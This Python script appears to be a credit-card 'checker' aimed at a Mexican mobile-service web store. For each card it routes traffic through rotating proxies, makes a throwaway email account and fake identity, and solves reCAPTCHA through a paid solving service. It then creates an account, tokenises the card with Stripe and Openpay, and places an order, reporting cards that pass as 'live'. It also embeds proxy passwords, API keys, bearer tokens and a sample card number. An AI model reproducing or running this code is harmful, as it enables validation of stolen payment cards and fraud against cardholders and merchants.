
import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b

from bs4 import BeautifulSoup

import json
from functools import wraps
from pathlib import Path
from datetime import datetime, timezone, timedelta
from urllib.parse import urlencode
import requests
import json
import time
import re
import asyncio
import logging
import random
import uuid
import socket
import time
import re
def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
def check_stock_or_die(response, card):
    try:
        data = json.loads(response.text)
    except json.JSONDecodeError:
        return {
            "status": "Dead",
            "message": "Respuesta no válida",
            "cc": card
        }

    sims = data.get("sim_cards", [])

    # ❌ NO HAY STOCK → CORTA TODO
    if not sims:
        return {
            "status": "Dead",
            "message": "NO HAY STOCK",
            "cc": card
        }

    # ✅ HAY STOCK → CONTINÚA EJECUCIÓN
    return None


# ================= CONFIG =================

proxy = "p.webshare.io:80"
proxy_auth = "vgdgihxr-rotate:czeted9ynghb"

temp_mail_api = "https://api.mail.tm"
fallback_temp_mail_api = "https://api.guerrillamail.com"
second_fallback_temp_mail_api = "https://api.tempmail.plus"

proxies = {
    "http": f"http://{proxy_auth}@{proxy}",
    "https": f"http://{proxy_auth}@{proxy}"
}

logging.basicConfig(level=logging.INFO)

# ================= HELPERS =================

def check_dns(hostname):
    try:
        socket.gethostbyname(hostname)
        print(f"✅ DNS OK → {hostname}")
        return True
    except Exception as e:
        print(f"❌ DNS FAIL → {hostname}: {e}")
        return False


def extract_code(text):
    match = re.search(r"\b(\d{4,8})\b", text)
    return match.group(1) if match else None


def proxy_test():
    print("\n🌐 PROBANDO PROXY...")
    r = requests.get(
        "https://api.ipify.org?format=json",
        proxies=proxies,
        timeout=15
    )
    print("🧠 IP SALIDA:", r.json()["ip"])


# ================= EMAIL =================

def generate_temp_email():
    print("\n📧 GENERANDO CORREO TEMPORAL (mail.tm)...")

    # 1️⃣ Obtener dominio
    r = requests.get(
        f"{temp_mail_api}/domains",
        proxies=proxies,
        timeout=15
    )
    r.raise_for_status()

    domain = r.json()["hydra:member"][0]["domain"]

    email = f"{uuid.uuid4().hex[:8]}@{domain}"
    password = f"Pass{random.randint(1000,9999)}!"

    # 2️⃣ Crear cuenta
    r = requests.post(
        f"{temp_mail_api}/accounts",
        json={"address": email, "password": password},
        proxies=proxies,
        timeout=15
    )

    if r.status_code not in (200, 201):
        print("❌ Error creando cuenta:", r.text)
        return None, None, None

    print(f"✅ EMAIL CREADO: {email}")

    # 3️⃣ Obtener TOKEN
    r = requests.post(
        f"{temp_mail_api}/token",
        json={"address": email, "password": password},
        proxies=proxies,
        timeout=15
    )

    if r.status_code != 200:
        print("❌ Error obteniendo token:", r.text)
        return None, None, None

    token = r.json()["token"]

    print("🔐 TOKEN OBTENIDO CORRECTAMENTE")

    return email, token, "mail.tm"

def extract_code(text: str):
    """
    Extrae códigos de verificación de 4 a 8 dígitos
    """
    if not text:
        return None

    match = re.search(r"\b(\d{4,8})\b", text)
    if match:
        return match.group(1)

    return None


def get_verification_code(token, max_attempts=15):
    print("\n📬 ESPERANDO CORREO DE AMAZON...")

    for i in range(max_attempts):
        try:
            r = requests.get(
                f"{temp_mail_api}/messages",
                headers={"Authorization": f"Bearer {token}"},
                proxies=proxies,
                timeout=15
            )

            if r.status_code != 200:
                print(f"⚠ Error HTTP {r.status_code}")
                time.sleep(10)
                continue

            mails = r.json().get("hydra:member", [])
            print(f"📥 INTENTO {i+1} → {len(mails)} correos")

            for mail in mails:
                sender = (
                    mail.get("from", {}).get("address", "") or
                    mail.get("from", {}).get("name", "")
                ).lower()

                subject = mail.get("subject", "").lower()

                if "amazon" not in sender and "amazon" not in subject:
                    continue

                print("\n📧 CORREO AMAZON DETECTADO")
                print("De:", sender)
                print("Asunto:", subject)

                text = (
                    mail.get("text", "") or
                    mail.get("intro", "") or
                    mail.get("html", "") or
                    ""
                )

                print("\n======= CONTENIDO =======")
                print(text[:500])
                print("=========================")

                code = extract_code(text)
                if code:
                    print(f"\n✅ CÓDIGO DE VERIFICACIÓN AMAZON: {code}")
                    return code

            time.sleep(10)

        except Exception as e:
            print(f"❌ ERROR LEYENDO CORREO: {e}")
            time.sleep(10)

    print("❌ NO LLEGÓ NINGÚN CÓDIGO DE AMAZON")
    return None
def procesar_tarjeta(card: str) -> str:   
    max_retries = 3
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            proxy_user = "package-322189-country-mx-region-yucatan-city-merida-isp-telmex+fibra"
            proxy_pass = "SKRo8Dkct0MlViur"
            proxy_host = "proxy.soax.com"
            proxy_port = 5000

            # Crear la URL del proxy
            proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"

            # Crear sesión
            c = requests.Session()

            # Configurar proxy en la sesión
            proxies = {
                "http": proxy_url,
                "https": proxy_url,
            }

            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
           

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
           
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            email = None
            token = None
            service = None
            if not email:
                    email, token, service =  generate_temp_email()
                    if not email:
                        return None
            headers = {
                'accept': '*/*',
                'accept-language': 'es-MX,es;q=0.9,en-MX;q=0.8,en;q=0.7,es-419;q=0.6',
                'cache-control': 'no-cache',
                'origin': 'https://tienda.ultracel.com.mx',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://tienda.ultracel.com.mx/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }

            params = {
                'imei': '353495111910597',
                'sim_card_type': 'embedded',
            }

            response = c.get('https://ultravision.api.koonolmexico.com/altan/imei_check', params=params, headers=headers)

            headers = {
                'accept': '*/*',
                'accept-language': 'es-MX,es;q=0.9,en-MX;q=0.8,en;q=0.7,es-419;q=0.6',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiI0YWI2M2NmZi00NWRlLTQwMmQtYWEyZC05ODdmY2FiYzQ4MTAifQ.S4rL9liUM0yPbzOvCpHGlUnp1wegGFepYvtGpVuTqx8',
                'cache-control': 'no-cache',
                'origin': 'https://tienda.ultracel.com.mx',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://tienda.ultracel.com.mx/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }

            params = {
                'bundle_id': '129',
            }

            response = c.get('https://ultravision.api.koonolmexico.com/sim_cards/sim_cards', params=params, headers=headers)
            result = check_stock_or_die(response, card)

            if result:
                return result 
            
            api_key = "5ce129ec4745149faf2ff1cc16166a71"

            # Sitio donde está el reCAPTCHA
            website_url = "https://tienda.ultracel.com.mx/paso-2"

            # Sitekey extraído del HTML del sitio (en el <div class="g-recaptcha" data-sitekey="...">)
            sitekey = "6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll"

            # Paso 1: Crear la tarea
            create_task_payload = {
                "clientKey": api_key,
                "task": {
                    "type": "NoCaptchaTaskProxyless",  # No usas proxy
                    "websiteURL": website_url,
                    "websiteKey": sitekey
                }
            }

            print("📤 Enviando captcha a CapMonster...")

            response = requests.post("https://api.capmonster.cloud/createTask", json=create_task_payload)
            result = response.json()

            if result.get("errorId") != 0:
                print("❌ Error al crear tarea:", result.get("errorCode"))
                exit()

            task_id = result["taskId"]
            print("🆔 Tarea creada con ID:", task_id)

            # Paso 2: Consultar la solución
            get_result_payload = {
                "clientKey": api_key,
                "taskId": task_id
            }

            for i in range(20):
                time.sleep(5)  # espera entre intentos
                res = requests.post("https://api.capmonster.cloud/getTaskResult", json=get_result_payload)
                res_json = res.json()

                if res_json.get("status") == "ready":
                    token = res_json["solution"]["gRecaptchaResponse"]
                    print("✅ CAPTCHA resuelto con éxito.")
                   
                    break
                else:
                    print(f"⏳ Esperando respuesta ({i+1}/20)...")

            else:
                print("❌ Tiempo de espera agotado.")


            headers = {
                'authority': 'ultravision.api.koonolmexico.com',
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-ES,es;q=0.9',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiI0YWI2M2NmZi00NWRlLTQwMmQtYWEyZC05ODdmY2FiYzQ4MTAifQ.5TLxTvyC1fCy7KfNPHgYtzbBxmR3y2LAuWd7mAXEqAjC',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://tienda.ultracel.com.mx',
                'pragma': 'no-cache',
                'referer': 'https://tienda.ultracel.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'user': {
                    'signup_status': 'authorized',
                    'name': name,
                    'last_name': last,
                    'maiden_name': '',
                    'email': email,
                    'phone': None,
                    'mobile_phone': '9971556986',
                    'google_recaptcha_token': token,
                    'curp': 'QUGR990914HYNTMD07',
                    'privacy_acceptance': True,
                },
            }

            response = c.post('https://ultravision.api.koonolmexico.com/users', headers=headers, json=json_data)

            code =  get_verification_code(token)
            print(f"[EMAIL] ✅ Código de verificación recibido: {code}")
            responsePm = json.loads(response.text)
            print(responsePm)
            user_id = responsePm['user']['id']
            print(user_id)

            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }

            data = f'time_on_page=2250042&pasted_fields=number&guid=ddaa8b59-5638-4619-91f7-781323976c71b62da2&muid=ee90dea3-34c0-47e3-9f32-9cde86e6d60544f35f&sid=8c0d3cd1-a315-44a7-943b-3ed5d9896b7e4ba3ee&key=pk_live_51KKQdXAt4hwC9EzPlECBse8oe2zN759C4zpyQtIPxEhTjFnu6o0AWxouefUoWPPv2hV6a1H4fUWLwF8S1wVA8MLW00zHX9O87k&payment_user_agent=stripe.js%2F78ef418&card[number]={cc_number}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano_number}'

            response = c.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            responsePm = json.loads(response.text)
            token_id = responsePm['id']
            print(token_id)

            headers = {
                'accept': 'application/json',
                'accept-language': 'es-MX,es;q=0.9,en-MX;q=0.8,en;q=0.7,es-419;q=0.6',
                'authorization': 'Basic cGtfNWE0ZTlkNzY3NWQ4NDBiMTlkYTY1OWE1YWY1MTRjZjY6',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'origin': 'https://tienda.ultracel.com.mx',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://tienda.ultracel.com.mx/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-storage-access': 'active',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }

            json_data = {
                'holder_name': name+last,
                'card_number': cc_number,
                'cvv2': cvv,
                'expiration_month': mes,
                'expiration_year': ano_number[-2:],
            }

            response = c.post('https://api.openpay.mx/v1/mznycdanwswudouttxam/tokens', headers=headers, json=json_data)
            responsePm = json.loads(response.text)
            tokenop = responsePm['id']
            print(tokenop)

            api_key = "5ce129ec4745149faf2ff1cc16166a71"

            # Sitio donde está el reCAPTCHA
            website_url = "https://tienda.ultracel.com.mx/paso-3"

            # Sitekey extraído del HTML del sitio (en el <div class="g-recaptcha" data-sitekey="...">)
            sitekey = "6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll"

            # Paso 1: Crear la tarea
            create_task_payload = {
                "clientKey": api_key,
                "task": {
                    "type": "NoCaptchaTaskProxyless",  # No usas proxy
                    "websiteURL": website_url,
                    "websiteKey": sitekey
                }
            }

            print("📤 Enviando captcha a CapMonster...")

            response = requests.post("https://api.capmonster.cloud/createTask", json=create_task_payload)
            result = response.json()

            if result.get("errorId") != 0:
                print("❌ Error al crear tarea:", result.get("errorCode"))
                exit()

            task_id = result["taskId"]
            print("🆔 Tarea creada con ID:", task_id)

            # Paso 2: Consultar la solución
            get_result_payload = {
                "clientKey": api_key,
                "taskId": task_id
            }

            for i in range(20):
                time.sleep(5)  # espera entre intentos
                res = requests.post("https://api.capmonster.cloud/getTaskResult", json=get_result_payload)
                res_json = res.json()

                if res_json.get("status") == "ready":
                    token = res_json["solution"]["gRecaptchaResponse"]
                    print("✅ CAPTCHA resuelto con éxito.")
                   
                    break
                else:
                    print(f"⏳ Esperando respuesta ({i+1}/20)...")

            else:
                print("❌ Tiempo de espera agotado.")

            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-MX,es;q=0.9,en-MX;q=0.8,en;q=0.7,es-419;q=0.6',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiI0YWI2M2NmZi00NWRlLTQwMmQtYWEyZC05ODdmY2FiYzQ4MTAifQ.S4rL9liUM0yPbzOvCpHGlUnp1wegGFepYvtGpVuTqx8',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://tienda.ultracel.com.mx',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://tienda.ultracel.com.mx/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }

            json_data = {
                'payment_card': {
                    'openpay_token': tokenop,
                    'openpay_device_session_id': 'NJerI5k0nlNrwAiD90FuFOYZxTn5rZXl',
                    'stripe_token': token_id,
                    'is_default': True,
                    'payment_method': 'card',
                    'identification_number': None,
                    'mercado_pago_token': None,
                },
                'user_id': user_id,
            }

            response = c.post('https://ultravision.api.koonolmexico.com/payment_cards', headers=headers, json=json_data)
            headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'accept-language': 'es-MX,es;q=0.9,en-MX;q=0.8,en;q=0.7,es-419;q=0.6',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiI0YWI2M2NmZi00NWRlLTQwMmQtYWEyZC05ODdmY2FiYzQ4MTAifQ.S4rL9liUM0yPbzOvCpHGlUnp1wegGFepYvtGpVuTqx8',
                'cache-control': 'no-cache',
                'content-type': 'application/json; charset=UTF-8',
                'origin': 'https://tienda.ultracel.com.mx',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://tienda.ultracel.com.mx/',
                'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
            }

            json_data = {
                'altan_service_bundle_order': {
                    'user_id': user_id,
                    'payment_method': 'card',
                    'concept': 'bundle',
                    'latitude': 20.5964312,
                    'longitude': -100.388084,
                    'recurring_payments': False,
                    'payment_plan': None,
                    'nir': None,
                    'code': None,
                    'admin_id': None,
                    'promoter_code': None,
                    'dpcard_number': None,
                    'activation_code_qr_file_url': None,
                    'source_type': 'e_commerce',
                    'sim_card_type': None,
                    'google_recaptcha_token': token,
                    'bundle_id': '129',
                },
                'user_id': user_id,
            }

            response = requests.post('https://ultravision.api.koonolmexico.com/altan_service_bundle_orders', headers=headers, json=json_data)
            responsePm = json.loads(response.text)
            print(responsePm)
            return {"status": "live", "message": "Live Auth" , "cc": card}

        except Exception as e:
            print(e)
            retry_count += 1
    else:

        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}


if __name__ == "__main__":
    print(procesar_tarjeta("4555113012888071|01|2031|245"))